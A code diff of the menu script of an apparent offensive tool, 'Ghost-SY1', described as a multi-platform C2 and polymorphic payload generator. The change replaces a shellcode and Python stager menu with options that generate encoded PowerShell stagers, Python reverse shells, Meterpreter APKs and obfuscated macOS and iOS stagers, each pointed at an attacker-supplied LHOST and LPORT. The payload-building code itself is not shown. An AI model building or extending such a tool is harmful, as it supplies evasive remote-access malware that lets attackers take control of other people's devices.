@@ -4,7 +4,7 @@ from rich.console import Console
 from rich.panel import Panel
 from rich.prompt import Prompt
 from rich.syntax import Syntax
-from core.generator import StandaloneEliteEngine
+from core.generator import MultiPlatformEliteEngine
 BANNER = """
  [bold red] ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗     ██████╗ ██████╗ ██████╗ ███████╗[/bold red]
  [bold red]██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝     ██╔══██╗██╔══██╗██╔══██╗██╔════╝[/bold red]
@@ -12,8 +12,8 @@ BANNER = """
  [bold white]██║   ██║██╔══██║██║   ██║╚════██║   ██║        ██╔═══╝ ██╔═══╝ ██╔═══╝ ╚════██║[/bold white]
  [bold blue]╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ██╗  ██║     ██║     ██║     ███████║[/bold blue]
  [bold blue] ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝     ╚═╝     ╚═╝     ╚══════╝[/bold blue]
- [bold yellow]         Standalone Elite C2 & Native Raw Shellcode Engine[/bold yellow]
- [italic cyan]                               Ghost-SY1 Security 2026[/italic cyan]
+ [bold yellow]     Multi-Platform Elite C2 & Polymorphic Payload Generator (2026)[/bold yellow]
+ [italic cyan]                               Ghost-SY1 Security[/italic cyan]
 """
 console = Console()
 def clear_screen():
@@ -21,25 +21,22 @@ def clear_screen():
 def main():
     clear_screen()
     console.print(Panel(BANNER, border_style="bold red", expand=False))
-    lhost = Prompt.ask("[bold yellow]Enter Standalone Listener LHOST[/bold yellow]")
-    lport = int(Prompt.ask("[bold yellow]Enter Standalone Listener LPORT[/bold yellow]"))
-    console.print("[bold cyan][1][/bold cyan] Polymorphic Python Stager (Standalone Obfuscation)")
-    console.print("[bold cyan][2][/bold cyan] Raw Shellcode Generator (Hex & C-Array Native Generation)")
-    console.print("[bold cyan][3][/bold cyan] Standalone Python C2 Listener Script (No Kali/Metasploit Needed)")
-    choice = Prompt.ask("[bold yellow]Select Operation Mode[/bold yellow]", choices=["1", "2", "3"])
-    engine = StandaloneEliteEngine(lhost, lport)
-    if choice == "1":
-        payload = engine.generate_polymorphic_python()
-        syntax = Syntax(payload, "python", theme="monokai", line_numbers=True)
-        console.print(Panel(syntax, title="Standalone Polymorphic Python Stager", border_style="bold green"))
-    elif choice == "2":
-        arch = Prompt.ask("[bold yellow]Architecture[/bold yellow]", choices=["x64", "x86"], default="x64")
-        res = engine.generate_standalone_raw_shellcode(arch)
-        console.print(Panel(f"[bold red]Raw Hex Shellcode:[/bold red]\n{res['hex']}", border_style="red"))
-        console.print(Panel(f"[bold yellow]C-Array Shellcode Buffer:[/bold yellow]\n{{ {res['c_array']} }}", border_style="yellow"))
-    elif choice == "3":
-        listener = engine.generate_native_listener_script()
-        syntax = Syntax(listener, "python", theme="monokai", line_numbers=True)
-        console.print(Panel(syntax, title="Standalone Native C2 Listener", border_style="bold green"))
+    lhost = Prompt.ask("[bold yellow]Enter Listener LHOST[/bold yellow]")
+    lport = int(Prompt.ask("[bold yellow]Enter Listener LPORT[/bold yellow]"))
+    console.print("[bold cyan][1][/bold cyan] Windows (PowerShell Encoded Stager)")
+    console.print("[bold cyan][2][/bold cyan] Linux (Polymorphic Python Reverse Shell)")
+    console.print("[bold cyan][3][/bold cyan] Android (Meterpreter APK Generator Command)")
+    console.print("[bold cyan][4][/bold cyan] macOS (Obfuscated Zsh/Python Stager)")
+    console.print("[bold cyan][5][/bold cyan] iOS / iPhone (Base64 Encoded Sh Stager)")
+    choice = Prompt.ask("[bold yellow]Select Target Operating System[/bold yellow]", choices=["1", "2", "3", "4", "5"])
+    platforms = {"1": "windows", "2": "linux", "3": "android", "4": "macos", "5": "ios"}
+    target_os = platforms.get(choice, "windows")
+    engine = MultiPlatformEliteEngine(lhost, lport)
+    payload = engine.generate_payload(target_os)
+    if target_os == "android":
+        console.print(Panel(f"[bold red]Android Generation Command:[/bold red]\n{payload}", border_style="red"))
+    else:
+        syntax = Syntax(payload, "bash" if target_os in ["linux", "ios", "macos"] else "powershell", theme="monokai", line_numbers=True)
+        console.print(Panel(syntax, title=f"Elite Payload for {target_os.upper()}", border_style="bold green"))
 if __name__ == "__main__":
     main()
